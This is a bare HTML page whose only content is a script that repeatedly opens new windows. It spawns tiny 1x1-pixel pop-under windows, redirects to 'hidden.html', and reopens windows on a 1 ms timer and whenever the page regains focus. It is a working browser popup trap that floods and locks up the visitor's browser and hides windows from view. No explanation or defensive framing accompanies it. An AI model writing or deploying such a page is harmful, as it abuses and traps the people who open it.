<!DOCTYPE html>
<html>

    </head>
    <body>
        <script>
            var x = 0;
            setInterval(() => {
                if(!window.opener) {
                    if(x == 0) {
                        open();
                        location.href = "hidden.html";
                        window.open('hidden.html','','HEIGHT=1,WIDTH=1');
                    }
                    x = 1;
                }
            },1);
            onfocus = () => {
                window.open('hidden.html','','HEIGHT=1,WIDTH=1');
                open();
            }
            open();
        </script>
    </body>
</html>
